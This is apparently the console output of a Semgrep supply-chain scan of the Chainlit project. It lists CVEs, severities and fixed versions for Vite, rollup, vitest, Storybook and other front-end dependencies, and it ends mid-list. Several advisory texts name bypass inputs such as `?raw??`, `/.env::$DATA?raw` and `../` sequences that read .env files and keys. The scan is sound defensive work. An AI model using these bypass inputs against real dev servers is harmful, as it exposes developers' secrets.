@@ -1,0 +1,2084 @@
+# project: Chainlit__chainlit
+# scanner: semgrep-supply-chain
+# time: Fri Jul 10 21:20:37 2026
+$ docker run --rm -e SEMGREP_APP_TOKEN=*** -e SEMGREP_REPO_NAME=Chainlit__chainlit -e SEMGREP_GIT_COMMAND_TIMEOUT=1800 -v C:/Users/admin/Documents/Lab Workplace/f-vra/pyshare/data/raw/projects/Chainlit__chainlit:/src -v C:/Users/admin/Documents/Lab Workplace/f-vra/pyshare/data/_scans/semgrep-supply-chain:/out -w /src semgrep/semgrep semgrep ci --supply-chain --json-output=/out/Chainlit__chainlit.json
+# exit code: 0
+# note: native lock: uv.lock
+=== STDOUT ===
+                                      
+                                      
+┌────────────────────────────────────┐
+│ 44 Reachable Supply Chain Findings │
+└────────────────────────────────────┘
+                           
+    frontend/pnpm-lock.yaml
+    ❯❱ @babel/helpers - CVE-2025-27789
+          Severity: MODERATE                                                                                  
+          Affected versions of @babel/helpers, @babel/runtime, @babel/runtime-corejs2, and @babel/runtime-    
+          corejs3 are vulnerable to Inefficient Regular Expression Complexity. Babel generates a polyfill (the
+          `wrapRegExp` helper) for `String.prototype.replace` on regular expressions with named capturing     
+          groups that has quadratic (ReDoS) complexity when an untrusted replacement string containing the    
+          substring `$<` is processed. The vulnerable code is generated polyfill code rather than a symbol you
+          call directly, so any project transpiling named capturing groups against affected browser targets is
+          at risk. Upgrade to a patched version and recompile your code to remediate.                         
+                                                                                                              
+           ▶▶┆ Fixed for @babel/helpers at versions: 7.26.10, 8.0.0-alpha.17
+          372┆ '@babel/helpers@7.23.8':
+            ⋮┆----------------------------------------
+          397┆ '@babel/runtime@7.23.5':
+            ⋮┆----------------------------------------
+          401┆ '@babel/runtime@7.25.6':
+   
+    ❯❱ esbuild - GHSA-67mh-4wv8-2f99
+          Severity: MODERATE                                                                                  
+          Affected versions of esbuild are vulnerable to Origin Validation Error. esbuild's development server
+          responds to every request, including Server-Sent Events connections, with `Access-Control-Allow-    
+          Origin: *`. Any website a developer visits can therefore make cross-origin requests to the local dev
+          server and read the responses, leaking bundled source code, source maps, and served file paths.     
+          Starting the dev server via serve() reaches the vulnerable code path.                               
+                                                                                                              
+           ▶▶┆ Fixed for esbuild at version: 0.25.0
+          2703┆ esbuild@0.21.5:
+   
+    ❯❱ js-yaml - CVE-2025-64718
+          Severity: MODERATE                                                                                  
+          Affected versions of js-yaml are vulnerable to Improperly Controlled Modification of Object         
+          Prototype Attributes ('Prototype Pollution'). js-yaml is vulnerable to prototype pollution through  
+          its YAML merge key (`<<`) handling. When parsing untrusted YAML with `load`, `loadAll`, `safeLoad`, 
+          or `safeLoadAll`, a crafted document containing a `__proto__` key inside a merged mapping can modify
+          the prototype of the resulting object, leading to integrity violations in the application.          
+                                                                                                              
+           ▶▶┆ Fixed for js-yaml at versions: 3.14.2, 4.1.1
+          3263┆ js-yaml@4.1.0:
+   
+   ❯❯❱ rollup - CVE-2026-27606
+          Severity: HIGH                                                                                      
+          Affected versions of rollup are vulnerable to Improper Limitation of a Pathname to a Restricted     
+          Directory ('Path Traversal'). Rollup is vulnerable to arbitrary file write via path traversal:      
+          chunk/asset names derived from user-controlled inputs (e.g., CLI named inputs, manual chunk aliases,
+          or malicious plugins) are insufficiently sanitized, allowing `../` sequences to survive and be      
+          passed into `path.resolve` when computing output paths. This lets an attacker escape the configured 
+          output directory and overwrite arbitrary files on the host filesystem that the build process can    
+          write to, potentially leading to persistent RCE by clobbering shell/profile or other                
+          executable/config files.                                                                            
+                                                                                                              
+           ▶▶┆ Fixed for rollup at versions: 2.80.0, 3.30.0, 4.59.0
+          4132┆ rollup@4.31.0:
+   
+    ❯❱ vite - CVE-2025-31125
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized    
+          Actor / Improper Access Control. Vite's server.fs.deny file-access restriction can be bypassed by   
+          appending ?inline&import or ?raw?import query parameters to any request URL, allowing an attacker to
+          read arbitrary files from the host filesystem — including .env files and TLS private keys — when the
+          dev server is reachable from the network.                                                           
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 4.5.11, 5.4.16, 6.0.13, 6.1.3, 6.2.4
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-32395
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor. An attacker on the network can craft HTTP requests containing '#' in the request-target to
+          bypass Vite's server.fs.deny restrictions and read arbitrary files from the host machine.        
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.13, 5.4.18, 6.0.15, 6.1.5, 6.2.6
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-30208
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor / Improper Access Control. An attacker who can send HTTP requests to the exposed dev server
+          can read arbitrary files outside the project root by appending trailing query separators (e.g.   
+          ?raw??) to /@fs/ URLs, bypassing server.fs.deny access controls.                                 
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.10, 5.4.15, 6.0.12, 6.1.2, 6.2.3
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-46565
+          Severity: MODERATE                                                                              
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted   
+          Directory ('Path Traversal'). An attacker can bypass the server.fs.deny file-access blocklist by
+          requesting paths with a trailing /. segment, gaining read access to protected files such as .env
+          secrets and TLS certificates from the Vite dev server.                                          
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 4.5.14, 5.4.19, 6.1.6, 6.2.7, 6.3.4
+          4566┆ vite@5.4.14:
+   
+   ❯❯❱ vite - CVE-2026-53571
+          Severity: HIGH                                                                                      
+          Affected versions of vite and vite-plus are vulnerable to Exposure of Sensitive Information to an   
+          Unauthorized Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
+          Vite's server.fs.deny blocklist—which protects sensitive files such as .env and certificate files   
+          from being served—can be bypassed on Windows using alternate path representations (NTFS Alternate   
+          Data Stream syntax like `/.env::$DATA?raw`, or 8.3 short filenames), allowing an attacker to read   
+          otherwise-denied files when the dev server is exposed to the network.                               
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 6.4.3, 7.3.5, 8.0.16
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-31486
+          Severity: MODERATE                                                                                 
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized   
+          Actor / Improper Access Control. An attacker on the same network can exploit the server.fs.deny    
+          bypass to read arbitrary files from the server's filesystem, including sensitive files such as .env
+          files, private keys, and source code.                                                              
+                                                                                                             
+           ▶▶┆ Fixed for vite at versions: 4.5.12, 5.4.17, 6.0.14, 6.1.4, 6.2.5
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-62522
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted       
+          Directory ('Path Traversal'). Vite's server.fs.deny blocklist—which protects sensitive files such as
+          .env and certificate files from being served—can be bypassed on Windows by appending a trailing     
+          backslash to request URLs, allowing an attacker to read otherwise-denied files.                     
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 5.4.21, 6.4.1, 7.0.8, 7.1.11
+          4566┆ vite@5.4.14:
+   
+   ❯❯❯❱ vitest - CVE-2026-47429
+          Severity: CRITICAL                                                                                
+          Affected versions of vitest are vulnerable to Missing Authorization. When the Vitest UI server is 
+          listening, the deprecated isFileServingAllowed check is applied without normalizing the URL before
+          filesystem operations, allowing path traversal that lets an attacker read, write, and execute     
+          arbitrary files outside the project directory.                                                    
+                                                                                                            
+           ▶▶┆ Fixed for vitest at versions: 3.2.6, 4.1.0
+          4597┆ vitest@0.34.6:
+                               
+    libs/copilot/pnpm-lock.yaml
+    ❯❱ @babel/helpers - CVE-2025-27789
+          Severity: MODERATE                                                                                  
+          Affected versions of @babel/helpers, @babel/runtime, @babel/runtime-corejs2, and @babel/runtime-    
+          corejs3 are vulnerable to Inefficient Regular Expression Complexity. Babel generates a polyfill (the
+          `wrapRegExp` helper) for `String.prototype.replace` on regular expressions with named capturing     
+          groups that has quadratic (ReDoS) complexity when an untrusted replacement string containing the    
+          substring `$<` is processed. The vulnerable code is generated polyfill code rather than a symbol you
+          call directly, so any project transpiling named capturing groups against affected browser targets is
+          at risk. Upgrade to a patched version and recompile your code to remediate.                         
+                                                                                                              
+           ▶▶┆ Fixed for @babel/helpers at versions: 7.26.10, 8.0.0-alpha.17
+          226┆ '@babel/helpers@7.23.8':
+            ⋮┆----------------------------------------
+          239┆ '@babel/runtime@7.23.8':
+            ⋮┆----------------------------------------
+          243┆ '@babel/runtime@7.26.0':
+   
+    ❯❱ esbuild - GHSA-67mh-4wv8-2f99
+          Severity: MODERATE                                                                                  
+          Affected versions of esbuild are vulnerable to Origin Validation Error. esbuild's development server
+          responds to every request, including Server-Sent Events connections, with `Access-Control-Allow-    
+          Origin: *`. Any website a developer visits can therefore make cross-origin requests to the local dev
+          server and read the responses, leaking bundled source code, source maps, and served file paths.     
+          Starting the dev server via serve() reaches the vulnerable code path.                               
+                                                                                                              
+           ▶▶┆ Fixed for esbuild at version: 0.25.0
+          1447┆ esbuild@0.18.20:
+            ⋮┆----------------------------------------
+          1452┆ esbuild@0.21.5:
+   
+   ❯❯❱ handlebars - CVE-2026-33941
+          Severity: HIGH                                                                                      
+          Affected versions of handlebars are vulnerable to Improper Control of Generation of Code ('Code     
+          Injection') / Improper Encoding or Escaping of Output / Improper Neutralization of Input During Web 
+          Page Generation ('Cross-site Scripting'). The Handlebars CLI precompiler allows arbitrary JavaScript
+          injection by embedding unescaped template filenames and CLI option values such as `--namespace`,    
+          `--commonjs`, and `--handlebarPath` directly into generated output. An attacker who can control     
+          these inputs can cause malicious code to execute when the precompiled bundle is loaded in Node.js or
+          a browser.                                                                                          
+                                                                                                              
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+    ❯❱ js-yaml - CVE-2025-64718
+          Severity: MODERATE                                                                                  
+          Affected versions of js-yaml are vulnerable to Improperly Controlled Modification of Object         
+          Prototype Attributes ('Prototype Pollution'). js-yaml is vulnerable to prototype pollution through  
+          its YAML merge key (`<<`) handling. When parsing untrusted YAML with `load`, `loadAll`, `safeLoad`, 
+          or `safeLoadAll`, a crafted document containing a `__proto__` key inside a merged mapping can modify
+          the prototype of the resulting object, leading to integrity violations in the application.          
+                                                                                                              
+           ▶▶┆ Fixed for js-yaml at versions: 3.14.2, 4.1.1
+          1718┆ js-yaml@4.1.0:
+   
+   ❯❯❱ rollup - CVE-2026-27606
+          Severity: HIGH                                                                                      
+          Affected versions of rollup are vulnerable to Improper Limitation of a Pathname to a Restricted     
+          Directory ('Path Traversal'). Rollup is vulnerable to arbitrary file write via path traversal:      
+          chunk/asset names derived from user-controlled inputs (e.g., CLI named inputs, manual chunk aliases,
+          or malicious plugins) are insufficiently sanitized, allowing `../` sequences to survive and be      
+          passed into `path.resolve` when computing output paths. This lets an attacker escape the configured 
+          output directory and overwrite arbitrary files on the host filesystem that the build process can    
+          write to, potentially leading to persistent RCE by clobbering shell/profile or other                
+          executable/config files.                                                                            
+                                                                                                              
+           ▶▶┆ Fixed for rollup at versions: 2.80.0, 3.30.0, 4.59.0
+          2168┆ rollup@4.24.0:
+   
+   ❯❯❱ storybook - CVE-2025-68429
+          Severity: HIGH                                                                                     
+          Affected versions of storybook are vulnerable to Exposure of Sensitive Information to an           
+          Unauthorized Actor / Inclusion of Sensitive Information in an Include File / Insertion of Sensitive
+          Information into Externally-Accessible File or Directory. A bug in Storybook's build process causes
+          any environment variables defined in a `.env` file (e.g. `.env.local`) in the project directory to 
+          be unexpectedly bundled into the static output. When that build is published to the web, those     
+          variables —including any secrets—are exposed in the client‐side source.                            
+                                                                                                             
+           ▶▶┆ Fixed for storybook at versions: 10.1.10, 7.6.21, 8.6.15, 9.1.17
+          2243┆ storybook@8.4.7:
+   
+   ❯❯❱ storybook - CVE-2026-27148
+          Severity: HIGH                                                                                      
+          Affected versions of storybook are vulnerable to Improper Neutralization of Input During Web Page   
+          Generation ('Cross-site Scripting') / Improper Neutralization of Special Elements in Output Used by 
+          a Downstream Component ('Injection') / Missing Origin Validation in WebSockets. Storybook's dev     
+          server WebSocket endpoint does not validate the `Origin` of incoming connections, enabling WebSocket
+          hijacking. If a developer visits a malicious website while a local Storybook dev server is running  
+          (or if the dev server is publicly exposed), an attacker can open an unauthorized WebSocket          
+          connection and invoke the "create/save story" handlers to write attacker-controlled content into    
+          story files, leading to persistent XSS and potentially remote code execution and supply-chain       
+          compromise if the injected changes are committed and propagated.                                    
+                                                                                                              
+           ▶▶┆ Fixed for storybook at versions: 10.2.10, 8.6.17, 9.1.19
+          2243┆ storybook@8.4.7:
+   
+    ❯❱ vite - CVE-2025-31125
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized    
+          Actor / Improper Access Control. Vite's server.fs.deny file-access restriction can be bypassed by   
+          appending ?inline&import or ?raw?import query parameters to any request URL, allowing an attacker to
+          read arbitrary files from the host filesystem — including .env files and TLS private keys — when the
+          dev server is reachable from the network.                                                           
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 4.5.11, 5.4.16, 6.0.13, 6.1.3, 6.2.4
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-32395
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor. An attacker on the network can craft HTTP requests containing '#' in the request-target to
+          bypass Vite's server.fs.deny restrictions and read arbitrary files from the host machine.        
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.13, 5.4.18, 6.0.15, 6.1.5, 6.2.6
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-30208
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor / Improper Access Control. An attacker who can send HTTP requests to the exposed dev server
+          can read arbitrary files outside the project root by appending trailing query separators (e.g.   
+          ?raw??) to /@fs/ URLs, bypassing server.fs.deny access controls.                                 
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.10, 5.4.15, 6.0.12, 6.1.2, 6.2.3
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-46565
+          Severity: MODERATE                                                                              
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted   
+          Directory ('Path Traversal'). An attacker can bypass the server.fs.deny file-access blocklist by
+          requesting paths with a trailing /. segment, gaining read access to protected files such as .env
+          secrets and TLS certificates from the Vite dev server.                                          
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 4.5.14, 5.4.19, 6.1.6, 6.2.7, 6.3.4
+          2449┆ vite@5.4.14:
+   
+   ❯❯❱ vite - CVE-2026-53571
+          Severity: HIGH                                                                                      
+          Affected versions of vite and vite-plus are vulnerable to Exposure of Sensitive Information to an   
+          Unauthorized Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
+          Vite's server.fs.deny blocklist—which protects sensitive files such as .env and certificate files   
+          from being served—can be bypassed on Windows using alternate path representations (NTFS Alternate   
+          Data Stream syntax like `/.env::$DATA?raw`, or 8.3 short filenames), allowing an attacker to read   
+          otherwise-denied files when the dev server is exposed to the network.                               
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 6.4.3, 7.3.5, 8.0.16
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-31486
+          Severity: MODERATE                                                                                 
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized   
+          Actor / Improper Access Control. An attacker on the same network can exploit the server.fs.deny    
+          bypass to read arbitrary files from the server's filesystem, including sensitive files such as .env
+          files, private keys, and source code.                                                              
+                                                                                                             
+           ▶▶┆ Fixed for vite at versions: 4.5.12, 5.4.17, 6.0.14, 6.1.4, 6.2.5
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-62522
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted       
+          Directory ('Path Traversal'). Vite's server.fs.deny blocklist—which protects sensitive files such as
+          .env and certificate files from being served—can be bypassed on Windows by appending a trailing     
+          backslash to request URLs, allowing an attacker to read otherwise-denied files.                     
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 5.4.21, 6.4.1, 7.0.8, 7.1.11
+          2449┆ vite@5.4.14:
+                                    
+    libs/react-client/pnpm-lock.yaml
+    ❯❱ @babel/helpers - CVE-2025-27789
+          Severity: MODERATE                                                                                  
+          Affected versions of @babel/helpers, @babel/runtime, @babel/runtime-corejs2, and @babel/runtime-    
+          corejs3 are vulnerable to Inefficient Regular Expression Complexity. Babel generates a polyfill (the
+          `wrapRegExp` helper) for `String.prototype.replace` on regular expressions with named capturing     
+          groups that has quadratic (ReDoS) complexity when an untrusted replacement string containing the    
+          substring `$<` is processed. The vulnerable code is generated polyfill code rather than a symbol you
+          call directly, so any project transpiling named capturing groups against affected browser targets is
+          at risk. Upgrade to a patched version and recompile your code to remediate.                         
+                                                                                                              
+           ▶▶┆ Fixed for @babel/helpers at versions: 7.26.10, 8.0.0-alpha.17
+          173┆ '@babel/helpers@7.23.2':
+            ⋮┆----------------------------------------
+          198┆ '@babel/runtime@7.23.2':
+   
+    ❯❱ esbuild - GHSA-67mh-4wv8-2f99
+          Severity: MODERATE                                                                                  
+          Affected versions of esbuild are vulnerable to Origin Validation Error. esbuild's development server
+          responds to every request, including Server-Sent Events connections, with `Access-Control-Allow-    
+          Origin: *`. Any website a developer visits can therefore make cross-origin requests to the local dev
+          server and read the responses, leaking bundled source code, source maps, and served file paths.     
+          Starting the dev server via serve() reaches the vulnerable code path.                               
+                                                                                                              
+           ▶▶┆ Fixed for esbuild at version: 0.25.0
+          1045┆ esbuild@0.18.20:
+            ⋮┆----------------------------------------
+          1050┆ esbuild@0.21.5:
+   
+   ❯❯❱ rollup - CVE-2026-27606
+          Severity: HIGH                                                                                      
+          Affected versions of rollup are vulnerable to Improper Limitation of a Pathname to a Restricted     
+          Directory ('Path Traversal'). Rollup is vulnerable to arbitrary file write via path traversal:      
+          chunk/asset names derived from user-controlled inputs (e.g., CLI named inputs, manual chunk aliases,
+          or malicious plugins) are insufficiently sanitized, allowing `../` sequences to survive and be      
+          passed into `path.resolve` when computing output paths. This lets an attacker escape the configured 
+          output directory and overwrite arbitrary files on the host filesystem that the build process can    
+          write to, potentially leading to persistent RCE by clobbering shell/profile or other                
+          executable/config files.                                                                            
+                                                                                                              
+           ▶▶┆ Fixed for rollup at versions: 2.80.0, 3.30.0, 4.59.0
+          1624┆ rollup@4.24.0:
+   
+    ❯❱ vite - CVE-2025-31125
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized    
+          Actor / Improper Access Control. Vite's server.fs.deny file-access restriction can be bypassed by   
+          appending ?inline&import or ?raw?import query parameters to any request URL, allowing an attacker to
+          read arbitrary files from the host filesystem — including .env files and TLS private keys — when the
+          dev server is reachable from the network.                                                           
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 4.5.11, 5.4.16, 6.0.13, 6.1.3, 6.2.4
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-32395
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor. An attacker on the network can craft HTTP requests containing '#' in the request-target to
+          bypass Vite's server.fs.deny restrictions and read arbitrary files from the host machine.        
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.13, 5.4.18, 6.0.15, 6.1.5, 6.2.6
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-30208
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor / Improper Access Control. An attacker who can send HTTP requests to the exposed dev server
+          can read arbitrary files outside the project root by appending trailing query separators (e.g.   
+          ?raw??) to /@fs/ URLs, bypassing server.fs.deny access controls.                                 
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.10, 5.4.15, 6.0.12, 6.1.2, 6.2.3
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-46565
+          Severity: MODERATE                                                                              
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted   
+          Directory ('Path Traversal'). An attacker can bypass the server.fs.deny file-access blocklist by
+          requesting paths with a trailing /. segment, gaining read access to protected files such as .env
+          secrets and TLS certificates from the Vite dev server.                                          
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 4.5.14, 5.4.19, 6.1.6, 6.2.7, 6.3.4
+          1889┆ vite@5.4.14:
+   
+   ❯❯❱ vite - CVE-2026-53571
+          Severity: HIGH                                                                                      
+          Affected versions of vite and vite-plus are vulnerable to Exposure of Sensitive Information to an   
+          Unauthorized Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
+          Vite's server.fs.deny blocklist—which protects sensitive files such as .env and certificate files   
+          from being served—can be bypassed on Windows using alternate path representations (NTFS Alternate   
+          Data Stream syntax like `/.env::$DATA?raw`, or 8.3 short filenames), allowing an attacker to read   
+          otherwise-denied files when the dev server is exposed to the network.                               
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 6.4.3, 7.3.5, 8.0.16
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-31486
+          Severity: MODERATE                                                                                 
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized   
+          Actor / Improper Access Control. An attacker on the same network can exploit the server.fs.deny    
+          bypass to read arbitrary files from the server's filesystem, including sensitive files such as .env
+          files, private keys, and source code.                                                              
+                                                                                                             
+           ▶▶┆ Fixed for vite at versions: 4.5.12, 5.4.17, 6.0.14, 6.1.4, 6.2.5
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-62522
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted       
+          Directory ('Path Traversal'). Vite's server.fs.deny blocklist—which protects sensitive files such as
+          .env and certificate files from being served—can be bypassed on Windows by appending a trailing     
+          backslash to request URLs, allowing an attacker to read otherwise-denied files.                     
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 5.4.21, 6.4.1, 7.0.8, 7.1.11
+          1889┆ vite@5.4.14:
+   
+   ❯❯❯❱ vitest - CVE-2026-47429
+          Severity: CRITICAL                                                                                
+          Affected versions of vitest are vulnerable to Missing Authorization. When the Vitest UI server is 
+          listening, the deprecated isFileServingAllowed check is applied without normalizing the URL before
+          filesystem operations, allowing path traversal that lets an attacker read, write, and execute     
+          arbitrary files outside the project directory.                                                    
+                                                                                                            
+           ▶▶┆ Fixed for vitest at versions: 3.2.6, 4.1.0
+          1920┆ vitest@0.34.4:
+                                         
+                                         
+┌───────────────────────────────────────┐
+│ 68 Undetermined Supply Chain Findings │
+└───────────────────────────────────────┘
+                           
+    frontend/pnpm-lock.yaml
+     ❱ @babel/core - CVE-2026-49356
+          Severity: LOW                                                                                       
+          Affected versions of @babel/core are vulnerable to Exposure of Sensitive Information to an          
+          Unauthorized Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
+                                                                                                              
+           ▶▶┆ Fixed for @babel/core at versions: 7.29.6, 8.0.0-rc.6
+          314┆ '@babel/core@7.23.7':
+   
+     ❱ @tootallnate/once - CVE-2026-3449
+          Severity: LOW                                                                           
+          Affected versions of @tootallnate/once are vulnerable to Incorrect Control Flow Scoping.
+                                                                                                  
+           ▶▶┆ Fixed for @tootallnate/once at versions: 2.0.1, 3.0.1
+          1924┆ '@tootallnate/once@2.0.0':
+   
+    ❯❱ brace-expansion - CVE-2026-33750
+          Severity: MODERATE                                                                       
+          Affected versions of brace-expansion are vulnerable to Uncontrolled Resource Consumption.
+                                                                                                   
+           ▶▶┆ Fixed for brace-expansion at versions: 1.1.13, 2.0.3, 3.0.2, 5.0.5
+          2227┆ brace-expansion@2.0.2:
+   
+    ❯❱ js-yaml - CVE-2026-53550
+          Severity: MODERATE                                                                
+          Affected versions of js-yaml are vulnerable to Inefficient Algorithmic Complexity.
+                                                                                            
+           ▶▶┆ Fixed for js-yaml at versions: 3.15.0, 4.2.0
+          3263┆ js-yaml@4.1.0:
+   
+    ❯❱ lodash - CVE-2025-13465
+          Severity: MODERATE                                                                               
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly
+          Controlled Modification of Object Prototype Attributes ('Prototype Pollution').                  
+                                                                                                           
+           ▶▶┆ Fixed for lodash at version: 4.17.23
+          3323┆ lodash@4.17.21:
+   
+    ❯❱ lodash - CVE-2026-2950
+          Severity: MODERATE                                                                               
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly
+          Controlled Modification of Object Prototype Attributes ('Prototype Pollution').                  
+                                                                                                           
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          3323┆ lodash@4.17.21:
+   
+    ❯❱ picomatch - CVE-2026-33672
+          Severity: MODERATE                                                                           
+          Affected versions of picomatch are vulnerable to Improperly Controlled Modification of Object
+          Prototype Attributes ('Prototype Pollution').                                                
+                                                                                                       
+           ▶▶┆ Fixed for picomatch at versions: 2.3.2, 3.0.2, 4.0.4
+          3748┆ picomatch@2.3.1:
+   
+    ❯❱ postcss - CVE-2026-41305
+          Severity: MODERATE                                                                             
+          Affected versions of postcss are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting').                                                           
+                                                                                                         
+           ▶▶┆ Fixed for postcss at version: 8.5.10
+          3813┆ postcss@8.4.49:
+   
+    ❯❱ protocol-buffers-schema - CVE-2026-5758
+          Severity: MODERATE                                                                                  
+          Affected versions of protocol-buffers-schema are vulnerable to Improperly Controlled Modification of
+          Object Prototype Attributes ('Prototype Pollution').                                                
+                                                                                                              
+           ▶▶┆ Fixed for protocol-buffers-schema at version: 3.6.1
+          3840┆ protocol-buffers-schema@3.6.0:
+   
+    ❯❱ react-router - CVE-2025-68470
+          Severity: MODERATE                                                                          
+          Affected versions of react-router are vulnerable to URL Redirection to Untrusted Site ('Open
+          Redirect').                                                                                 
+                                                                                                      
+           ▶▶┆ Fixed for react-router at versions: 6.30.2, 7.9.6
+          4007┆ react-router@6.15.0:
+   
+    ❯❱ react-router - CVE-2026-40181
+          Severity: MODERATE                                                                          
+          Affected versions of react-router are vulnerable to URL Redirection to Untrusted Site ('Open
+          Redirect').                                                                                 
+                                                                                                      
+           ▶▶┆ Fixed for react-router at versions: 6.30.4, 7.14.1
+          4007┆ react-router@6.15.0:
+   
+    ❯❱ uuid - CVE-2026-41907
+          Severity: MODERATE                                                                              
+          Affected versions of uuid are vulnerable to Improper Validation of Specified Index, Position, or
+          Offset in Input / Out-of-bounds Write.                                                          
+                                                                                                          
+           ▶▶┆ Fixed for uuid at versions: 11.1.1, 12.0.1, 13.0.1
+          4535┆ uuid@9.0.0:
+   
+     ❱ vite - CVE-2025-58752
+          Severity: LOW                                                                                   
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized
+          Actor / Improper Access Control / Relative Path Traversal.                                      
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 5.4.20, 6.3.6, 7.0.7, 7.1.5
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2026-53632
+          Severity: MODERATE                                                                                
+          Affected versions of launch-editor, vite, and vite-plus are vulnerable to External Control of File
+          Name or Path / Insufficiently Protected Credentials.                                              
+                                                                                                            
+           ▶▶┆ Fixed for vite at versions: 6.4.3, 7.3.5, 8.0.16
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2026-39365
+          Severity: MODERATE                                                                              
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized
+          Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').         
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 6.4.2, 7.3.2, 8.0.5
+          4566┆ vite@5.4.14:
+   
+     ❱ vite - CVE-2025-58751
+          Severity: LOW                                                                                       
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized    
+          Actor / Improper Access Control / Improper Limitation of a Pathname to a Restricted Directory ('Path
+          Traversal').                                                                                        
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 5.4.20, 6.3.6, 7.0.7, 7.1.5
+          4566┆ vite@5.4.14:
+   
+    ❯❱ ws - CVE-2026-45736
+          Severity: MODERATE                                                      
+          Affected versions of ws are vulnerable to Use of Uninitialized Resource.
+                                                                                  
+           ▶▶┆ Fixed for ws at version: 8.20.1
+          4702┆ ws@8.18.0:
+   
+    ❯❱ yaml - CVE-2026-33532
+          Severity: MODERATE                                                 
+          Affected versions of yaml are vulnerable to Uncontrolled Recursion.
+                                                                             
+           ▶▶┆ Fixed for yaml at versions: 1.10.3, 2.8.3
+          4732┆ yaml@2.4.1:
+                               
+    libs/copilot/pnpm-lock.yaml
+     ❱ @babel/core - CVE-2026-49356
+          Severity: LOW                                                                                       
+          Affected versions of @babel/core are vulnerable to Exposure of Sensitive Information to an          
+          Unauthorized Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
+                                                                                                              
+           ▶▶┆ Fixed for @babel/core at versions: 7.29.6, 8.0.0-rc.6
+          172┆ '@babel/core@7.23.7':
+   
